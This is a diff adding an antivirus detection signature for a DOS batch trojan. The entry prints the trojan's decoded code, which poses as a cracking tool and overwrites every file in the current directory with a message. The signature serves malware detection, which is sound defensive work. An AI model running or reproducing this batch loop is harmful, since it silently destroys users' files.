@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36631
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo cracking overnet... setlocal c:\ global /iq for %douh in (*.*) do echo share your filez - thank you!!! > %douh echo cracking complite... endlocal 
